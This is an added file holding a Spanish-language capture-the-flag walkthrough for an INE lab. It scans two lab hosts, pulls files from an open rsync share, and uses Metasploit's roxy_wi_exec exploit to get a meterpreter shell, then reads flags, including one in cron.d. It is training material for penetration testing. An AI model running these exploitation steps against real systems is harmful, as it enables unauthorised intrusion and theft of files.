@@ -1,0 +1,127 @@
+Lab Environment
+
+In this lab environment, you will have GUI access to a Kali Linux machine. Two machines are accessible at target1.ine.local and target2.ine.local.
+
+Objective: Using various exploration techniques, complete the following tasks to capture the associated flags:
+
+Flag 1: Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.
+Flag 2: The files on the RSYNC server hold valuable information. Explore the contents to find the flag.
+Flag 3: Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.
+Flag 4: Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.
+Tools
+
+The best tools for this lab are:
+
+Nmap
+Metasploit Framework
+rsync
+
+                Empezamos con el FLAG 1.
+
+Comenzamos haciendo todo en msfconsole
+        service postgresql start
+        msfconsole 
+        workspace -a flag1
+        db_nmap -sS -sV -O target1.ine.local
+Aqui podemos ver que nos da el servicio "rsync"
+        search type:auxiliary name:rsync
+        use auxiliary/scanner/rsync/modules_list
+        set RHOSTS target1.ine.local
+        run
+Nos aparecio exitoso pero no encontramos nada, entonces recurrimos a otro plan.
+Abrimos una ventana/terminal nueva en bash.
+        nmap -sS -sV -O target1.ine.local
+Vemos que nos da el servicio "rsync"
+        rsync rsync://target1.ine.local
+
+ENCONTRAMOS FLAG 1.
+
+                Empezamos FLAG 2
+
+        rsync rsync://target1.ine.local/backupwscohen
+        rsync rsync://target1.ine.local/backupwscohen/archivoencontrado.txt .
+        rsync rsync://target1.ine.local/backupwscohen/archivoencontrado.txt .
+        rsync rsync://target1.ine.local/backupwscohen/archivoencontrado.txt .
+Ahora buscamos con la opcion de ls para ver los archivos descargados
+        ls
+        cat archivoencontrado.txt
+        cat archivoencontrado.txt
+        cat archivoencontrado.txt
+En alguno de estos archivos encontrados podemos ver nuestra flag 2
+ENCONTRAMOS FLAG 2.
+
+                Empezamos FLAG 3.
+
+        msfconsole
+        search roxy_wi_exec
+        use exploit/linux/http/roxy_wi_exec
+        set RHOSTS target2.ine.local
+        set LHOST eth1
+        exploit
+Aqui nos debe de dar una session meterpreter.
+En la session meterpreter daremos los siguiente comandos.
+        shell
+        /bin/bash -i
+        cd /
+        ls
+        cat flag.txt
+ENCONTRAMOS NUESTRA FLAG 3.
+        
+                Empezamos FLAG 4.
+
+        cd etc
+        cd cron.d
+        ls
+        cat archivoencontrado
+        cat archivoencontrado 
+ENCONTRAMOS FLAG 4
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
